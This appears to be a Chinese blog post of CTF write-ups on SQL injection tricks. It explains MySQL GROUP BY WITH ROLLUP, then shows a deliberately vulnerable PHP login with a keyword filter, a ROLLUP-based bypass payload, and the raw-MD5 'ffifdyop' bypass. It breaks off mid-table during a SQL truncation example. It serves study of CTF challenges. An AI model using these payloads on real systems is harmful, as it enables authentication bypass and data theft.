@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang=>
+  <head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="description" content="">
+  <meta name="keywords" content="root">
+  
+    <link rel="icon" href="/favicon.ico">
+  
+    
+  <title>sql注入奇巧淫技 | The clown is laughing at you</title>
+  <link rel="stylesheet" href="/style.css">
+  <link rel="stylesheet" href="/lib/jquery.fancybox.min.css">
+  <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+</head>
+
+<body>
+  <header>
+  <div class="header-container">
+    <a class="logo" href="/">
+      <span>The clown is laughing at you</span>
+    </a>
+    <ul class="right-header">
+      
+        <li class="nav-item">
+          
+            <a href="/" class="item-link">首页</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/about" class="item-link">关于</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/archives" class="item-link">归档</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/tags" class="item-link">标签</a>
+          
+        </li>
+      
+    </ul>
+  </div>
+</header>
+
+  <main id="post">
+  <div class="content">
+    <article>
+        <section class="content markdown-body">
+          <h1>sql注入奇巧淫技</h1>
+          <div class="post-meta">
+            <i class="fa fa-calendar" aria-hidden="true"></i> <time>2019/04/02</time>
+            
+            
+          </div>
+          <p>持续更新中</p>
+<h1 id="group-by-…-with-rollup"><a href="#group-by-…-with-rollup" class="headerlink" title="group by … with rollup"></a>group by … with rollup</h1><h2 id="介绍group-by-…-with-rollup的用法"><a href="#介绍group-by-…-with-rollup的用法" class="headerlink" title="介绍group by … with rollup的用法"></a>介绍group by … with rollup的用法</h2><p>GROUP BY 语句根据一个或多个列对结果集进行分组。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; set names utf8;</span><br><span class="line">mysql&gt; SELECT * FROM employee_tbl;</span><br><span class="line">+----+--------+---------------------+--------+</span><br><span class="line">| id | name   | date                | singin |</span><br><span class="line">+----+--------+---------------------+--------+</span><br><span class="line">|  <span class="number">1</span> | 小明 | <span class="number">2016</span><span class="number">-04</span><span class="number">-22</span> <span class="number">15</span>:<span class="number">25</span>:<span class="number">33</span> |      <span class="number">1</span> |</span><br><span class="line">|  <span class="number">2</span> | 小王 | <span class="number">2016</span><span class="number">-04</span><span class="number">-20</span> <span class="number">15</span>:<span class="number">25</span>:<span class="number">47</span> |      <span class="number">3</span> |</span><br><span class="line">|  <span class="number">3</span> | 小丽 | <span class="number">2016</span><span class="number">-04</span><span class="number">-19</span> <span class="number">15</span>:<span class="number">26</span>:<span class="number">02</span> |      <span class="number">2</span> |</span><br><span class="line">|  <span class="number">4</span> | 小王 | <span class="number">2016</span><span class="number">-04</span><span class="number">-07</span> <span class="number">15</span>:<span class="number">26</span>:<span class="number">14</span> |      <span class="number">4</span> |</span><br><span class="line">|  <span class="number">5</span> | 小明 | <span class="number">2016</span><span class="number">-04</span><span class="number">-11</span> <span class="number">15</span>:<span class="number">26</span>:<span class="number">40</span> |      <span class="number">4</span> |</span><br><span class="line">|  <span class="number">6</span> | 小明 | <span class="number">2016</span><span class="number">-04</span><span class="number">-04</span> <span class="number">15</span>:<span class="number">26</span>:<span class="number">54</span> |      <span class="number">2</span> |</span><br><span class="line">+----+--------+---------------------+--------+</span><br><span class="line"><span class="number">6</span> rows in set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></p>
+<p>使用group by 之后<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT name, COUNT(*) FROM   employee_tbl GROUP BY name;</span><br><span class="line">+--------+----------+</span><br><span class="line">| name   | COUNT(*) |</span><br><span class="line">+--------+----------+</span><br><span class="line">| 小丽 |        <span class="number">1</span> |</span><br><span class="line">| 小明 |        <span class="number">3</span> |</span><br><span class="line">| 小王 |        <span class="number">2</span> |</span><br><span class="line">+--------+----------+</span><br><span class="line"><span class="number">3</span> rows in set (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure></p>
+<p>WITH ROLLUP<br>WITH ROLLUP 可以实现在分组统计数据基础上再进行相同的统计（SUM,AVG,COUNT…）。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select*from r;</span><br><span class="line">+------+-----+------+</span><br><span class="line">| name | cat | fish |</span><br><span class="line">+------+-----+------+</span><br><span class="line">| 小明 | x   | <span class="number">1</span>    |</span><br><span class="line">| 小明 | x   | <span class="number">2</span>    |</span><br><span class="line">| 小明 | x   | <span class="number">4</span>    |</span><br><span class="line">| 小明 | y   | <span class="number">2</span>    |</span><br><span class="line">| 小明 | y   | <span class="number">2</span>    |</span><br><span class="line">| 小明 | z   | <span class="number">1</span>    |</span><br><span class="line">| 小红 | x   | <span class="number">1</span>    |</span><br><span class="line">| 小红 | x   | <span class="number">3</span>    |</span><br><span class="line">| 小红 | y   | <span class="number">1</span>    |</span><br><span class="line">| 小红 | y   | <span class="number">2</span>    |</span><br><span class="line">| 小青 | y   | <span class="number">3</span>    |</span><br><span class="line">| 小青 | z   | <span class="number">2</span>    |</span><br><span class="line">| 小青 | z   | <span class="number">1</span>    |</span><br><span class="line">+------+-----+------+</span><br><span class="line"><span class="number">13</span> rows in set (<span class="number">0.05</span> sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select name,cat,fish,count(*) from r group by name,cat with rollup;</span><br><span class="line">+------+------+------+----------+</span><br><span class="line">| name | cat  | fish | count(*) |</span><br><span class="line">+------+------+------+----------+</span><br><span class="line">| 小红 | x    | <span class="number">1</span>    |        <span class="number">2</span> |</span><br><span class="line">| 小红 | y    | <span class="number">1</span>    |        <span class="number">2</span> |</span><br><span class="line">| 小红 | <span class="keyword">NULL</span> | <span class="number">1</span>    |        <span class="number">4</span> |</span><br><span class="line">| 小明 | x    | <span class="number">1</span>    |        <span class="number">3</span> |</span><br><span class="line">| 小明 | y    | <span class="number">2</span>    |        <span class="number">2</span> |</span><br><span class="line">| 小明 | z    | <span class="number">1</span>    |        <span class="number">1</span> |</span><br><span class="line">| 小明 | <span class="keyword">NULL</span> | <span class="number">1</span>    |        <span class="number">6</span> |</span><br><span class="line">| 小青 | y    | <span class="number">3</span>    |        <span class="number">1</span> |</span><br><span class="line">| 小青 | z    | <span class="number">2</span>    |        <span class="number">2</span> |</span><br><span class="line">| 小青 | <span class="keyword">NULL</span> | <span class="number">2</span>    |        <span class="number">3</span> |</span><br><span class="line">| <span class="keyword">NULL</span> | <span class="keyword">NULL</span> | <span class="number">2</span>    |       <span class="number">13</span> |</span><br><span class="line">+------+------+------+----------+</span><br><span class="line"><span class="number">11</span> rows in set (<span class="number">0.06</span> sec)</span><br><span class="line">mysql&gt; select name,cat,fish,count(*) from r group by name,cat,fish with rollup;</span><br><span class="line">+------+------+------+----------+</span><br><span class="line">| name | cat  | fish | count(*) |</span><br><span class="line">+------+------+------+----------+</span><br><span class="line">| 小红 | x    | <span class="number">1</span>    |        <span class="number">1</span> |</span><br><span class="line">| 小红 | x    | <span class="number">3</span>    |        <span class="number">1</span> |</span><br><span class="line">| 小红 | x    | <span class="keyword">NULL</span> |        <span class="number">2</span> |</span><br><span class="line">| 小红 | y    | <span class="number">1</span>    |        <span class="number">1</span> |</span><br><span class="line">| 小红 | y    | <span class="number">2</span>    |        <span class="number">1</span> |</span><br><span class="line">| 小红 | y    | <span class="keyword">NULL</span> |        <span class="number">2</span> |</span><br><span class="line">| 小红 | <span class="keyword">NULL</span> | <span class="keyword">NULL</span> |        <span class="number">4</span> |</span><br><span class="line">| 小明 | x    | <span class="number">1</span>    |        <span class="number">1</span> |</span><br><span class="line">| 小明 | x    | <span class="number">2</span>    |        <span class="number">1</span> |</span><br><span class="line">| 小明 | x    | <span class="number">4</span>    |        <span class="number">1</span> |</span><br><span class="line">| 小明 | x    | <span class="keyword">NULL</span> |        <span class="number">3</span> |</span><br><span class="line">| 小明 | y    | <span class="number">2</span>    |        <span class="number">2</span> |</span><br><span class="line">| 小明 | y    | <span class="keyword">NULL</span> |        <span class="number">2</span> |</span><br><span class="line">| 小明 | z    | <span class="number">1</span>    |        <span class="number">1</span> |</span><br><span class="line">| 小明 | z    | <span class="keyword">NULL</span> |        <span class="number">1</span> |</span><br><span class="line">| 小明 | <span class="keyword">NULL</span> | <span class="keyword">NULL</span> |        <span class="number">6</span> |</span><br><span class="line">| 小青 | y    | <span class="number">3</span>    |        <span class="number">1</span> |</span><br><span class="line">| 小青 | y    | <span class="keyword">NULL</span> |        <span class="number">1</span> |</span><br><span class="line">| 小青 | z    | <span class="number">1</span>    |        <span class="number">1</span> |</span><br><span class="line">| 小青 | z    | <span class="number">2</span>    |        <span class="number">1</span> |</span><br><span class="line">| 小青 | z    | <span class="keyword">NULL</span> |        <span class="number">2</span> |</span><br><span class="line">| 小青 | <span class="keyword">NULL</span> | <span class="keyword">NULL</span> |        <span class="number">3</span> |</span><br><span class="line">| <span class="keyword">NULL</span> | <span class="keyword">NULL</span> | <span class="keyword">NULL</span> |       <span class="number">13</span> |</span><br><span class="line">+------+------+------+----------+</span><br><span class="line"><span class="number">23</span> rows in set (<span class="number">0.07</span> sec)</span><br><span class="line">mysql&gt; select name,cat,fish,sum(fish) from r group by name with rollup;</span><br><span class="line">+------+-----+------+-----------+</span><br><span class="line">| name | cat | fish | sum(fish) |</span><br><span class="line">+------+-----+------+-----------+</span><br><span class="line">| 小红 | x   | <span class="number">1</span>    |         <span class="number">7</span> |</span><br><span class="line">| 小明 | x   | <span class="number">1</span>    |        <span class="number">12</span> |</span><br><span class="line">| 小青 | y   | <span class="number">3</span>    |         <span class="number">6</span> |</span><br><span class="line">| <span class="keyword">NULL</span> | y   | <span class="number">3</span>    |        <span class="number">25</span> |</span><br><span class="line">+------+-----+------+-----------+</span><br><span class="line"><span class="number">4</span> rows in set (<span class="number">0.05</span> sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; select name,cat,fish,sum(fish) from r group by name,cat with rollup;</span><br><span class="line">+------+------+------+-----------+</span><br><span class="line">| name | cat  | fish | sum(fish) |</span><br><span class="line">+------+------+------+-----------+</span><br><span class="line">| 小红 | x    | <span class="number">1</span>    |         <span class="number">4</span> |</span><br><span class="line">| 小红 | y    | <span class="number">1</span>    |         <span class="number">3</span> |</span><br><span class="line">| 小红 | <span class="keyword">NULL</span> | <span class="number">1</span>    |         <span class="number">7</span> |</span><br><span class="line">| 小明 | x    | <span class="number">1</span>    |         <span class="number">7</span> |</span><br><span class="line">| 小明 | y    | <span class="number">2</span>    |         <span class="number">4</span> |</span><br><span class="line">| 小明 | z    | <span class="number">1</span>    |         <span class="number">1</span> |</span><br><span class="line">| 小明 | <span class="keyword">NULL</span> | <span class="number">1</span>    |        <span class="number">12</span> |</span><br><span class="line">| 小青 | y    | <span class="number">3</span>    |         <span class="number">3</span> |</span><br><span class="line">| 小青 | z    | <span class="number">2</span>    |         <span class="number">3</span> |</span><br><span class="line">| 小青 | <span class="keyword">NULL</span> | <span class="number">2</span>    |         <span class="number">6</span> |</span><br><span class="line">| <span class="keyword">NULL</span> | <span class="keyword">NULL</span> | <span class="number">2</span>    |        <span class="number">25</span> |</span><br><span class="line">+------+------+------+-----------+</span><br><span class="line"><span class="number">11</span> rows in set (<span class="number">0.06</span> sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; select name,cat,fish,sum(fish) from r group by name,cat,fish with rollup;</span><br><span class="line">+------+------+------+-----------+</span><br><span class="line">| name | cat  | fish | sum(fish) |</span><br><span class="line">+------+------+------+-----------+</span><br><span class="line">| 小红 | x    | <span class="number">1</span>    |         <span class="number">1</span> |</span><br><span class="line">| 小红 | x    | <span class="number">3</span>    |         <span class="number">3</span> |</span><br><span class="line">| 小红 | x    | <span class="keyword">NULL</span> |         <span class="number">4</span> |</span><br><span class="line">| 小红 | y    | <span class="number">1</span>    |         <span class="number">1</span> |</span><br><span class="line">| 小红 | y    | <span class="number">2</span>    |         <span class="number">2</span> |</span><br><span class="line">| 小红 | y    | <span class="keyword">NULL</span> |         <span class="number">3</span> |</span><br><span class="line">| 小红 | <span class="keyword">NULL</span> | <span class="keyword">NULL</span> |         <span class="number">7</span> |</span><br><span class="line">| 小明 | x    | <span class="number">1</span>    |         <span class="number">1</span> |</span><br><span class="line">| 小明 | x    | <span class="number">2</span>    |         <span class="number">2</span> |</span><br><span class="line">| 小明 | x    | <span class="number">4</span>    |         <span class="number">4</span> |</span><br><span class="line">| 小明 | x    | <span class="keyword">NULL</span> |         <span class="number">7</span> |</span><br><span class="line">| 小明 | y    | <span class="number">2</span>    |         <span class="number">4</span> |</span><br><span class="line">| 小明 | y    | <span class="keyword">NULL</span> |         <span class="number">4</span> |</span><br><span class="line">| 小明 | z    | <span class="number">1</span>    |         <span class="number">1</span> |</span><br><span class="line">| 小明 | z    | <span class="keyword">NULL</span> |         <span class="number">1</span> |</span><br><span class="line">| 小明 | <span class="keyword">NULL</span> | <span class="keyword">NULL</span> |        <span class="number">12</span> |</span><br><span class="line">| 小青 | y    | <span class="number">3</span>    |         <span class="number">3</span> |</span><br><span class="line">| 小青 | y    | <span class="keyword">NULL</span> |         <span class="number">3</span> |</span><br><span class="line">| 小青 | z    | <span class="number">1</span>    |         <span class="number">1</span> |</span><br><span class="line">| 小青 | z    | <span class="number">2</span>    |         <span class="number">2</span> |</span><br><span class="line">| 小青 | z    | <span class="keyword">NULL</span> |         <span class="number">3</span> |</span><br><span class="line">| 小青 | <span class="keyword">NULL</span> | <span class="keyword">NULL</span> |         <span class="number">6</span> |</span><br><span class="line">| <span class="keyword">NULL</span> | <span class="keyword">NULL</span> | <span class="keyword">NULL</span> |        <span class="number">25</span> |</span><br><span class="line">+------+------+------+-----------+</span><br><span class="line"><span class="number">23</span> rows in set (<span class="number">0.07</span> sec)</span><br><span class="line">---------------------</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/04/02/sql注入奇巧淫技/1.png" alt=""></p>
+<h2 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'uname'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'pwd'</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;form action="" method="post"&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;input name="uname" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;input name="pwd" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;input type="submit" /&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;/form&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;!--source: source.txt--&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">AttackFilter</span><span class="params">($StrKey,$StrValue,$ArrReq)</span></span>&#123;  </span><br><span class="line">    <span class="keyword">if</span> (is_array($StrValue))&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//检测变量是否是数组</span></span><br><span class="line"></span><br><span class="line">        $StrValue=implode($StrValue);</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回由数组元素组合成的字符串</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$ArrReq.<span class="string">"/is"</span>,$StrValue)==<span class="number">1</span>)&#123;   </span><br><span class="line"></span><br><span class="line"><span class="comment">//匹配成功一次后就会停止匹配</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"水可载舟，亦可赛艇！"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$filter = <span class="string">"and|select|from|where|union|join|sleep|benchmark|,|\(|\)"</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key=&gt;$value)&#123; </span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历数组</span></span><br><span class="line"></span><br><span class="line">    AttackFilter($key,$value,$filter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$con = mysql_connect(<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>);</span><br><span class="line"><span class="keyword">if</span> (!$con)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Could not connect: '</span> . mysql_error());</span><br><span class="line">&#125;</span><br><span class="line">$db=<span class="string">"XXXXXX"</span>;</span><br><span class="line">mysql_select_db($db, $con);</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置活动的 MySQL 数据库</span></span><br><span class="line"></span><br><span class="line">$sql=<span class="string">"SELECT * FROM interest WHERE uname = '&#123;$_POST['uname']&#125;'"</span>;</span><br><span class="line">$query = mysql_query($sql); </span><br><span class="line"></span><br><span class="line"><span class="comment">//执行一条 MySQL 查询</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mysql_num_rows($query) == <span class="number">1</span>) &#123; </span><br><span class="line"></span><br><span class="line"><span class="comment">//返回结果集中行的数目</span></span><br><span class="line"></span><br><span class="line">    $key = mysql_fetch_array($query);</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($key[<span class="string">'pwd'</span>] == $_POST[<span class="string">'pwd'</span>]) &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"CTF&#123;XXXXXX&#125;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"亦可赛艇！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"一颗赛艇！"</span>;</span><br><span class="line">&#125;</span><br><span class="line">mysql_close($con);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这道题中的关键代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM interest WHERE uname = '&#123;$_POST['uname']&#125;'"</span>;</span><br><span class="line">$query = mysql_query($sql); </span><br><span class="line">...</span><br><span class="line">    $key = mysql_fetch_array($query);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($key[<span class="string">'pwd'</span>] == $_POST[<span class="string">'pwd'</span>]) &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"CTF&#123;XXXXXX&#125;"</span>;</span><br></pre></td></tr></table></figure></p>
+<p>数据库查询的pwd和上传的pwd相同时，返回flag<br>考察group by … with rollup的使用方法，同时根据查询语句<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM interest WHERE uname = '&#123;$_POST['uname']&#125;'"</span>;</span><br></pre></td></tr></table></figure></p>
+<p>放上payload:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">' or 1=1 group by pwd with rollup limit 1 offset 2#</span></span><br></pre></td></tr></table></figure></p>
+<p>group by pwd 是按照pwd来分组，此处是为了搭配 with rollup使用<br>with rollup 统计pwd组的信息，这里没用任何统计函数(sum,avg…)，多出的那一行的pwd列只能是NULL。<br>像这样：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+-------+-------+</span><br><span class="line">| uname | pwd   |</span><br><span class="line">+-------+-------+</span><br><span class="line">| usr1  | ***** |</span><br><span class="line">| usr2  | ***** |</span><br><span class="line">| usr2  | <span class="keyword">NULL</span>  |</span><br><span class="line">+-------+-------+</span><br></pre></td></tr></table></figure></p>
+<p>那我们接着去使用limit 1 offset 2,limit 1：只查询一行信息，offset 2:从第二行开始。</p>
+<h1 id="一个MD5的sql注入的技巧"><a href="#一个MD5的sql注入的技巧" class="headerlink" title="一个MD5的sql注入的技巧"></a>一个MD5的sql注入的技巧</h1><p>题目地址：<a href="http://ctf5.shiyanbar.com/web/houtai/ffifdyop.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/houtai/ffifdyop.php</a></p>
+<p>源代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$password=$_POST[<span class="string">'password'</span>];</span><br><span class="line">$sql = <span class="string">"SELECT * FROM admin WHERE username = 'admin' and password = '"</span>.md5($password,<span class="keyword">true</span>).<span class="string">"'"</span>;</span><br><span class="line">$result=mysqli_query($link,$sql);</span><br><span class="line"><span class="keyword">if</span>(mysqli_num_rows($result)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'flag is :'</span>.$flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'密码错误!'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这里的提交的password被md5()重新组合，然后再进行sql查询。<br>所以一般的sql注入是无法成功的。然后这里有一个很迷的技巧，就是提交的password为 ffifdyop</p>
+<p>md5(ffifdyop,32) = 276f722736c95d99e921722cf9ed621c</p>
+<p>转成字符串为’or’6�]��!r,��b </p>
+<p>完成注入。</p>
+<h1 id="sql约束"><a href="#sql约束" class="headerlink" title="sql约束"></a>sql约束</h1><p>题目地址：<a href="http://123.206.31.85:49163/" target="_blank" rel="noopener">http://123.206.31.85:49163/</a><br>攻击方式通过sql约束<br>本地复现：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  <span class="number">1</span> | Dumb     | Dumb       |</span><br><span class="line">|  <span class="number">2</span> | Angelina | I-kill-you |</span><br><span class="line">|  <span class="number">3</span> | Dummy    | p@ssword   |</span><br><span class="line">|  <span class="number">4</span> | secure   | crappy     |</span><br><span class="line">|  <span class="number">5</span> | stupid   | stupidity  |</span><br><span class="line">|  <span class="number">6</span> | superman | genious    |</span><br><span class="line">|  <span class="number">7</span> | batman   | mob!le     |</span><br><span class="line">|  <span class="number">8</span> | admin    | admin      |</span><br><span class="line">|  <span class="number">9</span> | admin1   | admin1     |</span><br><span class="line">| <span class="number">10</span> | admin2   | admin2     |</span><br><span class="line">| <span class="number">11</span> | admin3   | admin3     